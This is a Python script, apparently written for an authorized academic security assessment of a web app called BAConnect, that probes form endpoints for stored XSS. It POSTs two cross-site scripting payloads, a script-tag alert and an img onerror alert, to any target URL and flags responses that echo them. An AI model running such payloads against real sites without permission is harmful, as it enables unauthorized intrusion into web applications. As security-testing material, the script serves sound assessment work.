#!/usr/bin/env python3
# =============================================================================
# c4_xss_stored.py
# =============================================================================
# Description : Probes common form endpoints for stored XSS vulnerabilities
#               by submitting payloads via POST and checking whether they
#               are reflected back in the server response.
#
# Usage       : python3 c4_xss_stored.py <target_url>
#               Example: python3 c4_xss_stored.py https://example.com
#
# Dependencies: requests  (pip install requests)
#
# Note        : This script tests whether common form endpoints exist and
#               whether submitted payloads are reflected. A React SPA
#               may return HTTP 200 for all routes via catch-all routing —
#               manual verification is required to confirm true exposure.
#
# Context     : Written for an authorized academic security assessment of
#               BAConnect. Use only against systems you have explicit
#               written permission to test.
#
# Author      : Immanuel John Sia
# Assessment  : BAConnect - Web Application Security Assessment (FYP 2025)
# =============================================================================

import requests
import sys
import os
from datetime import datetime


# Common endpoints where form submissions might accept user input
FORM_ENDPOINTS = [
    "/contact",
    "/comment",
    "/feedback",
    "/submit",
    "/message",
]

# Payloads to submit — tests both script injection and event handler vectors
STORED_PAYLOADS = [
    {"name": "test", "email": "test@test.com", "message": "<script>alert('Stored XSS')</script>"},
    {"username": "test", "comment": "<img src=x onerror=alert('XSS')>"},
]


def main():
    if len(sys.argv) < 2:
        print("[!] Usage: python3 c4_xss_stored.py <target_url>")
        print("    Example: python3 c4_xss_stored.py https://example.com")
        sys.exit(1)

    target  = sys.argv[1].rstrip("/")
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Security-Test"})

    os.makedirs("results", exist_ok=True)
    ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_path = f"results/c4_stored_{ts}.txt"

    print(f"[*] Stored XSS endpoint probe against {target}")
    print(f"[*] Output : {output_path}")
    print()

    with open(output_path, "w") as out:
        out.write(f"Stored XSS Probe — {target}\n")
        out.write(f"Timestamp: {ts}\n")
        out.write("=" * 60 + "\n\n")

        for endpoint in FORM_ENDPOINTS:
            url = target + endpoint
            print(f"[*] Probing {url}")

            try:
                # Check whether endpoint returns 200
                get_response = session.get(url, timeout=10)
                status_line  = f"GET {url} → {get_response.status_code}"
                print(f"    {status_line}")
                out.write(f"{status_line}\n")

                if get_response.status_code == 200:
                    # Attempt POST with each payload
                    for payload in STORED_PAYLOADS:
                        post_response = session.post(url, data=payload, timeout=10)
                        out.write(f"  POST payload : {payload}\n")
                        out.write(f"  POST status  : {post_response.status_code}\n")

                        # Flag if any payload value appears in the POST response
                        for value in payload.values():
                            if str(value) in post_response.text:
                                flag = f"  [FLAG] Payload reflected in response: {value}"
                                print(flag)
                                out.write(flag + "\n")

                out.write("\n")

            except Exception as e:
                error = f"  [ERROR] {url}: {e}"
                print(error)
                out.write(error + "\n\n")

    print()
    print(f"[*] Stored XSS probe complete → {output_path}")
    print("    Manual verification required for any flagged endpoints.")


if __name__ == "__main__":
    main()
